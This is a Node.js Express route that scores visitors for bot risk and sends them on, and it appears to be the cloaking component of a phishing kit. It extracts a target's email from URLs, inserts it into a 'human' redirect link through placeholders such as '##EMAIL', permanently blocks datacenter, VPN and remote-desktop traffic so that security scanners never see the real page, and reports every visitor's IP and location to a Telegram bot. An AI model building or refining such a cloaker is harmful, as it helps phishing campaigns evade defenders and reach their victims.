const express = require('express');
const crypto = require('crypto');
const RiskEvent = require('../models/RiskEvent');
const BlockedIp = require('../models/BlockedIp');
const FilterProfile = require('../models/FilterProfile');
const env = require('../config/env');
const { sha256 } = require('../utils/hash');
const { calculateRisk } = require('../services/riskEngine');
const { verifyTurnstileToken } = require('../services/turnstile');
const { notifyVisitorToTelegram } = require('../services/telegramNotifier');
const { lookupGeo } = require('../services/geoLookup');

const router = express.Router();

const DEFAULT_PROFILE_SETTINGS = {
  filterLevel: 'medium',
  humanRedirectUrl: '',
  botRedirectUrl: '',
  minInteractions: 5,
  minBrowserTimeMs: 2500,
  challengeScore: 35,
  blockScore: 65,
  autoBlockEnabled: true,
  autoBlockThreshold: 3,
  autoBlockWindowMinutes: 15,
  telegramNotifyEnabled: false,
  telegramNotifyMode: 'both',
  telegramBotToken: '',
  telegramChatId: ''
};

const DECISION_STICKY_LOOKBACK_MS = 12 * 60 * 1000;
const DECISION_STICKY_COOLDOWN_MS = 5 * 60 * 1000;
const VPN_PROVIDER_REGEX =
  /vpn|proxy|tunnel|wireguard|openvpn|nordvpn|expressvpn|surfshark|mullvad|ipvanish|protonvpn|purevpn|windscribe/i;
const REMOTE_CONTROL_REGEX =
  /vnc|teamviewer|anydesk|remote\s*desktop|\brdp\b|xrdp|sunlogin|parsec|splashtop|screenconnect|connectwise\s*control|rustdesk|remmina/i;

function normalizeIp(ip) {
  return String(ip || '').trim();
}

function isLocalIp(ip) {
  const value = normalizeIp(ip).toLowerCase();
  return (
    value === '::1' ||
    value === '127.0.0.1' ||
    value.startsWith('::ffff:127.') ||
    value === 'localhost'
  );
}

function normalizeCountry(input) {
  const value = String(input || '').trim().toUpperCase();
  if (!value || value === 'XX' || value === 'T1') return 'UNKNOWN';
  return value;
}

function normalizeAsn(value) {
  const raw = String(value || '').trim().toUpperCase();
  if (!raw) return '';
  return raw.startsWith('AS') ? raw : `AS${raw}`;
}

function isResidentialCarrier({ isp, org }) {
  const combined = `${String(isp || '')} ${String(org || '')}`.toLowerCase();
  const residentialKeywords = [
    'at&t',
    'att ',
    'verizon',
    't-mobile',
    'tmobile',
    'comcast',
    'charter',
    'spectrum',
    'cox communications',
    'rogers',
    'bell canada',
    'telus',
    'vodafone',
    'telefonica',
    'orange'
  ];

  return residentialKeywords.some((keyword) => combined.includes(keyword));
}

function isDatacenterNetwork({ asn, isp, org }) {
  const combined = `${String(isp || '')} ${String(org || '')}`.toLowerCase();
  if (isResidentialCarrier({ isp, org })) return false;

  const datacenterKeywords = [
    'amazon',
    'aws',
    'google cloud',
    'google llc',
    'microsoft',
    'azure',
    'oracle cloud',
    'digitalocean',
    'linode',
    'vultr',
    'ovh',
    'hetzner',
    'contabo',
    'choopa',
    'leaseweb',
    'datacenter',
    'proxy',
    'vpn',
    'residential proxy'
  ];

  const normalizedAsn = normalizeAsn(asn);
  const knownDatacenterAsns = new Set([
    'AS396982',
    'AS15169',
    'AS16509',
    'AS14618',
    'AS8075',
    'AS200517',
    'AS14061',
    'AS16276',
    'AS13335'
  ]);

  if (normalizedAsn && knownDatacenterAsns.has(normalizedAsn)) return true;
  return datacenterKeywords.some((keyword) => combined.includes(keyword));
}

function evaluateBotConfidence({
  userAgent,
  deviceType,
  behavior,
  datacenterNetwork,
  challengePassed,
  hasTurnstileToken,
  isp,
  org,
  cfData,
  clientMeta
}) {
  let score = 0;
  const reasons = [];

  const ua = String(userAgent || '').toLowerCase();
  const networkText = `${String(isp || '')} ${String(org || '')}`.toLowerCase();
  const clientText = `${String(clientMeta?.browser || '')} ${String(clientMeta?.platform || '')} ${String(
    clientMeta?.device || ''
  )}`.toLowerCase();
  const combinedSignals = `${ua} ${clientText}`;

  if (/bot|spider|crawl|headless|puppeteer|playwright|selenium|phantom|curl|wget|python/.test(ua)) {
    score += 70;
    reasons.push('automation_user_agent');
  }

  if (datacenterNetwork) {
    score += 55;
    reasons.push('datacenter_network');
  }

  const dwellMs = Number(behavior?.dwellMs || 0);
  const interactionTotal =
    Number(behavior?.mouseMoves || 0) +
    Number(behavior?.clicks || 0) +
    Number(behavior?.keydowns || 0) +
    Number(behavior?.scrolls || 0);

  if (interactionTotal <= 1 && dwellMs > 0 && dwellMs < 1500) {
    score += 20;
    reasons.push('unnatural_low_interaction');
  }

  if (hasTurnstileToken && !challengePassed) {
    score += 20;
    reasons.push('challenge_failed');
  }

  if (cfData?.proxy) {
    score += 30;
    reasons.push('cloudflare_proxy_signal');
  }

  if (cfData?.hosting && !isResidentialCarrier({ isp, org })) {
    score += 20;
    reasons.push('cloudflare_hosting_signal');
  }

  if (VPN_PROVIDER_REGEX.test(networkText) && !isResidentialCarrier({ isp, org })) {
    score += 20;
    reasons.push('vpn_provider_network');
  }

  if (REMOTE_CONTROL_REGEX.test(combinedSignals)) {
    score += 25;
    reasons.push('remote_control_stack');
  }

  if (isResidentialCarrier({ isp, org })) {
    score -= 25;
  }

  if (deviceType === 'mobile' || deviceType === 'tablet') {
    score -= 10;
  }

  if (challengePassed) {
    score -= 30;
  }

  const normalizedScore = Math.max(0, score);
  const tier = normalizedScore >= 70 ? 'high' : normalizedScore >= 40 ? 'medium' : 'low';
  return { score: normalizedScore, tier, reasons };
}

async function getRecentDecisionStats({ ip, fingerprintHash, sessionId, fingerprintVisitorId }) {
  const conditions = [];
  if (ip) conditions.push({ ip });
  if (fingerprintHash) conditions.push({ fingerprintHash });
  if (sessionId) conditions.push({ sessionId });
  if (fingerprintVisitorId) conditions.push({ fingerprintVisitorId });

  if (conditions.length === 0) {
    return {
      allowCount: 0,
      challengeCount: 0,
      blockCount: 0,
      latestAction: '',
      latestAt: null
    };
  }

  const since = new Date(Date.now() - DECISION_STICKY_LOOKBACK_MS);
  const recentEvents = await RiskEvent.find({
    createdAt: { $gte: since },
    $or: conditions
  })
    .sort({ createdAt: -1 })
    .limit(12)
    .select('action createdAt')
    .lean();

  const stats = {
    allowCount: 0,
    challengeCount: 0,
    blockCount: 0,
    latestAction: recentEvents[0]?.action || '',
    latestAt: recentEvents[0]?.createdAt || null
  };

  for (const event of recentEvents) {
    if (event.action === 'allow') stats.allowCount += 1;
    if (event.action === 'challenge') stats.challengeCount += 1;
    if (event.action === 'block') stats.blockCount += 1;
  }

  return stats;
}

function getCountryNameFromCode(countryCode) {
  const code = normalizeCountry(countryCode);
  if (code === 'UNKNOWN') return '';

  try {
    const regionNames = new Intl.DisplayNames(['en'], { type: 'region' });
    const output = String(regionNames.of(code) || '').trim();
    return output;
  } catch (_error) {
    return '';
  }
}

function detectDeviceType(userAgent) {
  const ua = String(userAgent || '').toLowerCase();
  if (!ua) return 'unknown';
  if (/bot|spider|crawl|headless|slurp|python|curl|wget/.test(ua)) return 'bot';
  if (/tablet|ipad/.test(ua)) return 'tablet';
  if (/mobile|iphone|android/.test(ua)) return 'mobile';
  return 'desktop';
}

function detectOs(userAgent) {
  const ua = String(userAgent || '').toLowerCase();
  if (ua.includes('windows')) return 'windows';
  if (ua.includes('android')) return 'android';
  if (ua.includes('iphone') || ua.includes('ipad') || ua.includes('ios')) return 'ios';
  if (ua.includes('mac os') || ua.includes('macintosh')) return 'macos';
  if (ua.includes('linux')) return 'linux';
  return 'unknown';
}

function detectBrowser(userAgent) {
  const ua = String(userAgent || '').toLowerCase();
  if (ua.includes('edg/')) return 'edge';
  if (ua.includes('opr/') || ua.includes('opera')) return 'opera';
  if (ua.includes('chrome/')) return 'chrome';
  if (ua.includes('safari/') && !ua.includes('chrome/')) return 'safari';
  if (ua.includes('firefox/')) return 'firefox';
  return 'unknown';
}

function extractSourceFromReferrer(referrer) {
  try {
    const raw = String(referrer || '').trim();
    if (!raw) return 'direct';
    const hostname = new URL(raw).hostname.toLowerCase();
    if (!hostname) return 'direct';
    return hostname.replace(/^www\./, '');
  } catch (_error) {
    return 'direct';
  }
}

function normalizeSource(value, referrer) {
  const source = String(value || '').trim().toLowerCase();
  if (source) return source;
  return extractSourceFromReferrer(referrer);
}

function sanitizeEmail(value) {
  const raw = String(value || '').trim();
  if (!raw || raw.length > 254) return '';
  const normalized = raw.toLowerCase();
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(normalized)) return '';
  return normalized;
}

function extractEmailFromUrl(rawUrl) {
  const text = String(rawUrl || '').trim();
  if (!text) return '';

  const safeDecode = (value) => {
    try {
      return decodeURIComponent(String(value || ''));
    } catch (_error) {
      return String(value || '');
    }
  };

  const collectCandidates = (value) => {
    const raw = String(value || '');
    if (!raw) return [];
    const decoded = safeDecode(raw);
    return decoded === raw ? [raw] : [raw, decoded];
  };

  const findEmailInText = (value) => {
    for (const candidate of collectCandidates(value)) {
      const starPathMatch = candidate.match(/\*[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}/i);
      if (starPathMatch) {
        const starred = String(starPathMatch[0] || '').replace(/^\*/, '');
        const sanitizedStarred = sanitizeEmail(starred);
        if (sanitizedStarred) return sanitizedStarred;
      }

      const plainPathMatch = candidate.match(/[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}/i);
      if (plainPathMatch) {
        const sanitizedPath = sanitizeEmail(plainPathMatch[0]);
        if (sanitizedPath) return sanitizedPath;
      }
    }

    return '';
  };

  const fromRawText = findEmailInText(text);
  if (fromRawText) return fromRawText;

  const tryParse = (urlText) => {
    try {
      const parsed = new URL(urlText);
      const queryEmail =
        parsed.searchParams.get('email') ||
        parsed.searchParams.get('e') ||
        parsed.searchParams.get('recipient') ||
        parsed.searchParams.get('to') ||
        parsed.searchParams.get('user');
      const fromQuery = sanitizeEmail(queryEmail);
      if (fromQuery) return fromQuery;

      const fromPath = findEmailInText(parsed.pathname);
      if (fromPath) return fromPath;

      return findEmailInText(parsed.hash || '');
    } catch (_error) {
      return '';
    }
  };

  return tryParse(text) || tryParse(`https://x.local${text.startsWith('/') ? '' : '/'}${text}`);
}

function extractDetectedEmail(source, req) {
  const fromBody =
    sanitizeEmail(source.email) ||
    sanitizeEmail(source.recipientEmail) ||
    sanitizeEmail(source.recipient) ||
    sanitizeEmail(source.to) ||
    sanitizeEmail(source.user);
  if (fromBody) return fromBody;

  const fromQuery =
    sanitizeEmail(req.query?.email) ||
    sanitizeEmail(req.query?.e) ||
    sanitizeEmail(req.query?.recipient) ||
    sanitizeEmail(req.query?.to) ||
    sanitizeEmail(req.query?.user);
  if (fromQuery) return fromQuery;

  return (
    extractEmailFromUrl(source.pageUrl) ||
    extractEmailFromUrl(source.url) ||
    extractEmailFromUrl(source.referrer) ||
    extractEmailFromUrl(req.headers.referer || '') ||
    extractEmailFromUrl(source.path || source.landingPath || '')
  );
}

function applyEmailTemplate(url, email) {
  const base = String(url || '');
  if (!base) return base;

  let output = base;
  if (email) {
    const rawEmail = String(email || '').trim();
    const encodedEmail = encodeURIComponent(email);
    output = output
      .replace(/##EMAIL_RAW/g, rawEmail)
      .replace(/\{\{\s*email_raw\s*\}\}/gi, rawEmail)
      .replace(/\[\s*EMAIL_RAW\s*\]/g, rawEmail)
      .replace(/\*EMAIL_RAW/g, `*${rawEmail}`)
      .replace(/##EMAIL/g, encodedEmail)
      .replace(/\{\{\s*email\s*\}\}/gi, encodedEmail)
      .replace(/\[\s*EMAIL\s*\]/g, encodedEmail)
      .replace(/\*EMAIL/g, `*${rawEmail}`)
      .replace(/\*[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}/gi, `*${rawEmail}`)
      .replace(/\*[a-z0-9._%+-]+%40[a-z0-9.-]+\.[a-z]{2,}/gi, `*${rawEmail}`)
      .replace(/%2a[a-z0-9._%+-]+%40[a-z0-9.-]+\.[a-z]{2,}/gi, `*${rawEmail}`)
      .replace(/([?&]email=)(?=(&|#|$))/i, `$1${encodedEmail}`);
  }

  return output;
}

function generateClickId(sessionId, ip) {
  const randomHex = crypto.randomBytes(16).toString('hex');
  const hash = crypto
    .createHash('sha256')
    .update(`${randomHex}|${sessionId || ''}|${ip || ''}|${Date.now()}|${Math.random()}`)
    .digest('hex');
  return `${randomHex}.${hash}`;
}

function applyUniqueClickId(url, clickId) {
  const base = String(url || '').trim();
  if (!base || !clickId) return base;

  if (/##UNIQUE##|\{\{\s*unique\s*\}\}|\[\s*UNIQUE\s*\]/i.test(base)) {
    return base
      .replace(/##UNIQUE##/g, clickId)
      .replace(/\{\{\s*unique\s*\}\}/gi, clickId)
      .replace(/\[\s*UNIQUE\s*\]/g, clickId);
  }

  const [withoutHash, hashFragment = ''] = base.split('#');
  const [pathPart, queryPart = ''] = withoutHash.split('?');
  const cleanPath = pathPart.endsWith('/') ? pathPart.slice(0, -1) : pathPart;
  const withPath = `${cleanPath}/${clickId}`;
  const withQuery = queryPart ? `${withPath}?${queryPart}` : withPath;
  return hashFragment ? `${withQuery}#${hashFragment}` : withQuery;
}

async function isIpBlacklisted(ip) {
  if (!ip) return null;
  const now = new Date();
  return BlockedIp.findOne({
    ip,
    $or: [{ expiresAt: null }, { expiresAt: { $gt: now } }]
  }).lean();
}

async function getActiveProfile() {
  const profile = await FilterProfile.findOne({ isActive: true }).lean();
  if (!profile) {
    return {
      profileId: 'profile_1',
      name: 'Profile 1',
      settings: { ...DEFAULT_PROFILE_SETTINGS }
    };
  }
  return {
    profileId: profile.profileId,
    name: profile.name,
    settings: { ...DEFAULT_PROFILE_SETTINGS, ...(profile.settings || {}) }
  };
}

async function maybeAutoBlacklist(ip, runtimeSettings) {
  const autoBlockEnabled = runtimeSettings?.autoBlockEnabled ?? env.autoBlockEnabled;
  const autoBlockThreshold = Math.max(1, Number(runtimeSettings?.autoBlockThreshold ?? env.autoBlockThreshold));
  const autoBlockWindowMinutes = Math.max(
    1,
    Number(runtimeSettings?.autoBlockWindowMinutes ?? env.autoBlockWindowMinutes)
  );

  if (!autoBlockEnabled || !ip) return;

  const since = new Date(Date.now() - autoBlockWindowMinutes * 60 * 1000);
  const highRiskCount = await RiskEvent.countDocuments({
    ip,
    createdAt: { $gte: since },
    action: { $in: ['challenge', 'block'] }
  });

  if (highRiskCount < autoBlockThreshold) return;

  await BlockedIp.findOneAndUpdate(
    { ip },
    {
      $set: {
        source: 'auto',
        reason: `auto_threshold_${autoBlockThreshold}_within_${autoBlockWindowMinutes}m`,
        lastSeenAt: new Date(),
        expiresAt: null
      },
      $inc: { hitCount: 1 }
    },
    { upsert: true, new: true }
  );
}

router.post('/assess', async (req, res) => {
  try {
    const source = req.body && typeof req.body === 'object' ? req.body : {};
    const detectedEmail = extractDetectedEmail(source, req);
    const fingerprint = source.fingerprint || '';
    const fingerprintVisitorId = String(source.fingerprintVisitorId || '').trim();
    const fingerprintRequestId = String(source.fingerprintRequestId || '').trim();
    const sessionId = source.sessionId || '';
    const turnstileToken = source.turnstileToken || '';
    const cfData = source.cfData && typeof source.cfData === 'object' ? source.cfData : {};

    const ip = normalizeIp(req.headers['cf-connecting-ip'] || req.ip || '');
    const clickId = generateClickId(sessionId, ip);
    const userAgent = req.headers['user-agent'] || '';
    const fingerprintSeed = fingerprintVisitorId || fingerprint;
    const fingerprintHash = fingerprintSeed ? sha256(fingerprintSeed) : '';
    const activeProfile = await getActiveProfile();
    const profileSettings = activeProfile.settings;
    const clientMeta = source.clientMeta && typeof source.clientMeta === 'object' ? source.clientMeta : {};
    const referrer = String(source.referrer || req.headers.referer || '').trim();
    const path = String(source.path || source.landingPath || '').trim();
    const initialCountry = normalizeCountry(
      source.country || req.headers['cf-ipcountry'] || req.headers['x-vercel-ip-country'] || ''
    );
    const geo = await lookupGeo(ip);
    const country = normalizeCountry(geo?.countryCode || geo?.country || initialCountry);
    const countryNameRaw = String(geo?.country || '').trim();
    const countryName = countryNameRaw && countryNameRaw.length > 2 ? countryNameRaw : getCountryNameFromCode(country);
    const city = String(geo?.city || '').trim();
    const state = String(geo?.state || geo?.region || '').trim();
    const latitude = String(geo?.latitude ?? '').trim();
    const longitude = String(geo?.longitude ?? '').trim();
    const timezone = String(geo?.timezone || '').trim();
    const isp = String(geo?.isp || '').trim();
    const org = String(geo?.org || '').trim();
    const asn = String(geo?.asn || '').trim();
    const deviceType = detectDeviceType(userAgent);
    const os = detectOs(userAgent);
    const browser = detectBrowser(userAgent);
    const trafficSource = normalizeSource(source.source || source.utmSource, referrer);
    const datacenterNetwork = isDatacenterNetwork({ asn, isp, org });
    const recentDecisionStats = await getRecentDecisionStats({
      ip,
      fingerprintHash,
      sessionId,
      fingerprintVisitorId
    });

    const blacklisted = await isIpBlacklisted(ip);
    if (blacklisted) {
      if (blacklisted.source === 'real_device_only' && !datacenterNetwork) {
        const recoveryCandidate =
          recentDecisionStats.allowCount >= 2 &&
          recentDecisionStats.blockCount === 0 &&
          isResidentialCarrier({ isp, org });
        if (recoveryCandidate) {
          await BlockedIp.deleteOne({ _id: blacklisted._id });
        }
      }

      const stillBlacklisted = await isIpBlacklisted(ip);
      if (stillBlacklisted) {
        await BlockedIp.updateOne(
          { _id: stillBlacklisted._id },
          { $set: { lastSeenAt: new Date() }, $inc: { hitCount: 1 } }
        );

        await RiskEvent.create({
          fingerprintHash,
          fingerprintVisitorId,
          fingerprintRequestId,
          sessionId,
          ip,
          score: 100,
          action: 'block',
          challengePassed: false,
          source: trafficSource,
          country,
          countryName,
          city,
          state,
          latitude,
          longitude,
          timezone,
          isp,
          org,
          asn,
          deviceType,
          os,
          browser,
          referrer,
          path,
          behavior: source.behavior || {},
          reason: `blacklisted_ip:${stillBlacklisted.reason || stillBlacklisted.source}`,
          userAgent
        });

        void notifyVisitorToTelegram({
          action: 'block',
          ip,
          geo: {
            city,
            state,
            region: state,
            country: countryName,
            countryCode: country,
            latitude,
            longitude,
            timezone,
            isp,
            org,
            asn
          },
          host: req.headers.host || '',
          cfRay: req.headers['cf-ray'] || '',
          acceptLanguage: req.headers['accept-language'] || '',
          acceptEncoding: req.headers['accept-encoding'] || '',
          userAgent,
          sessionId,
          deviceType,
          clientMeta: {
            ...clientMeta,
            browser: clientMeta.browser || userAgent,
            platform: clientMeta.platform || source.platform || ''
          },
          profileSettings
        });

        return res.json({
          success: true,
          allow: false,
          action: 'block',
          score: 100,
          reasons: ['blacklisted_ip'],
          challengeRequired: false,
          challengePassed: false,
          blacklisted: true,
          detectedEmail,
          clickId,
          profile: { id: activeProfile.profileId, name: activeProfile.name },
          redirectUrl: applyUniqueClickId(applyEmailTemplate(profileSettings.botRedirectUrl, detectedEmail), clickId)
        });
      }
    }

    let challengePassed = false;
    if (turnstileToken) {
      const result = await verifyTurnstileToken(turnstileToken, ip);
      challengePassed = result.success;
    } else if (env.localhostTurnstileBypass && env.nodeEnv !== 'production' && isLocalIp(ip)) {
      challengePassed = true;
    }

    const risk = await calculateRisk({
      fingerprintHash,
      ip,
      behavior: source.behavior,
      challengePassed,
      settings: profileSettings
    });

    const botConfidence = evaluateBotConfidence({
      userAgent,
      deviceType,
      behavior: source.behavior,
      datacenterNetwork,
      challengePassed,
      hasTurnstileToken: Boolean(turnstileToken),
      isp,
      org,
      cfData,
      clientMeta
    });

    const forceDatacenterBlock = datacenterNetwork && !challengePassed && botConfidence.tier !== 'low';
    const forceRemoteControlBlock = !challengePassed && botConfidence.reasons.includes('remote_control_stack');

    if (botConfidence.tier === 'high' || forceDatacenterBlock || forceRemoteControlBlock) {
      risk.score = Math.max(risk.score, 98);
      risk.action = 'block';
      if (botConfidence.tier === 'high' && !risk.reasons.includes('bot_confidence_high')) {
        risk.reasons.push('bot_confidence_high');
      }
      if (forceDatacenterBlock && !risk.reasons.includes('datacenter_force_block')) {
        risk.reasons.push('datacenter_force_block');
      }
      if (forceRemoteControlBlock && !risk.reasons.includes('remote_control_force_block')) {
        risk.reasons.push('remote_control_force_block');
      }
      for (const reason of botConfidence.reasons) {
        if (!risk.reasons.includes(reason)) {
          risk.reasons.push(reason);
        }
      }

      if (datacenterNetwork && ip) {
        await BlockedIp.findOneAndUpdate(
          { ip },
          {
            $set: {
              source: 'real_device_only',
              reason: `datacenter_network:${normalizeAsn(asn) || org || isp || 'unknown'}`,
              lastSeenAt: new Date(),
              expiresAt: null
            },
            $inc: { hitCount: 1 }
          },
          { upsert: true, new: true }
        );
      }

      if (forceRemoteControlBlock && ip) {
        await BlockedIp.findOneAndUpdate(
          { ip },
          {
            $set: {
              source: 'real_device_only',
              reason: 'remote_control_signature',
              lastSeenAt: new Date(),
              expiresAt: null
            },
            $inc: { hitCount: 1 }
          },
          { upsert: true, new: true }
        );
      }
    } else if (botConfidence.tier === 'medium') {
      risk.score = Math.max(risk.score, Number(profileSettings.challengeScore || 35));
      if (risk.action === 'allow') {
        risk.action = 'challenge';
      }
      if (!risk.reasons.includes('bot_confidence_medium')) {
        risk.reasons.push('bot_confidence_medium');
      }
      for (const reason of botConfidence.reasons) {
        if (!risk.reasons.includes(reason)) {
          risk.reasons.push(reason);
        }
      }
    }

    const latestRecentAt = recentDecisionStats.latestAt ? new Date(recentDecisionStats.latestAt).getTime() : 0;
    const withinCooldown = latestRecentAt && Date.now() - latestRecentAt <= DECISION_STICKY_COOLDOWN_MS;

    if (withinCooldown && recentDecisionStats.latestAction === 'block' && risk.action === 'allow') {
      risk.action = 'challenge';
      risk.score = Math.max(risk.score, Number(profileSettings.challengeScore || 35));
      if (!risk.reasons.includes('decision_sticky_recent_block')) {
        risk.reasons.push('decision_sticky_recent_block');
      }
    }

    if (
      withinCooldown &&
      recentDecisionStats.latestAction === 'allow' &&
      risk.action === 'challenge' &&
      botConfidence.tier === 'low' &&
      !datacenterNetwork
    ) {
      risk.action = 'allow';
      risk.score = Math.min(risk.score, Math.max(0, Number(profileSettings.challengeScore || 35) - 5));
      if (!risk.reasons.includes('decision_sticky_recent_allow')) {
        risk.reasons.push('decision_sticky_recent_allow');
      }
    }

    if (
      recentDecisionStats.blockCount >= 2 &&
      recentDecisionStats.allowCount === 0 &&
      risk.action === 'allow' &&
      botConfidence.tier !== 'low'
    ) {
      risk.action = 'challenge';
      risk.score = Math.max(risk.score, Number(profileSettings.challengeScore || 35));
      if (!risk.reasons.includes('decision_hysteresis_block_leaning')) {
        risk.reasons.push('decision_hysteresis_block_leaning');
      }
    }

    await RiskEvent.create({
      fingerprintHash,
      fingerprintVisitorId,
      fingerprintRequestId,
      sessionId,
      ip,
      score: risk.score,
      action: risk.action,
      challengePassed,
      source: trafficSource,
      country,
      countryName,
      city,
      state,
      latitude,
      longitude,
      timezone,
      isp,
      org,
      asn,
      deviceType,
      os,
      browser,
      referrer,
      path,
      behavior: risk.behavior,
      reason: risk.reasons.join(','),
      userAgent
    });

    void notifyVisitorToTelegram({
      action: risk.action,
      ip,
      geo: {
        city,
        state,
        region: state,
        country: countryName,
        countryCode: country,
        latitude,
        longitude,
        timezone,
        isp,
        org,
        asn
      },
      host: req.headers.host || '',
      cfRay: req.headers['cf-ray'] || '',
      acceptLanguage: req.headers['accept-language'] || '',
      acceptEncoding: req.headers['accept-encoding'] || '',
      userAgent,
      sessionId,
      deviceType,
      clientMeta: {
        ...clientMeta,
        browser: clientMeta.browser || userAgent,
        platform: clientMeta.platform || source.platform || ''
      },
      profileSettings
    });

    if (risk.action === 'challenge' || risk.action === 'block') {
      await maybeAutoBlacklist(ip, profileSettings);
    }

    const redirectUrl =
      risk.action === 'allow'
        ? profileSettings.humanRedirectUrl
        : profileSettings.botRedirectUrl;

    let resolvedRedirectUrl = applyEmailTemplate(redirectUrl, detectedEmail);
    resolvedRedirectUrl = applyUniqueClickId(resolvedRedirectUrl, clickId);

    return res.json({
      success: true,
      allow: risk.action === 'allow',
      action: risk.action,
      score: risk.score,
      reasons: risk.reasons,
      challengeRequired: risk.action !== 'allow',
      challengePassed,
      detectedEmail,
      clickId,
      profile: { id: activeProfile.profileId, name: activeProfile.name },
      redirectUrl: resolvedRedirectUrl
    });
  } catch (error) {
    return res.status(500).json({ success: false, error: error.message || String(error) });
  }
});

module.exports = router;
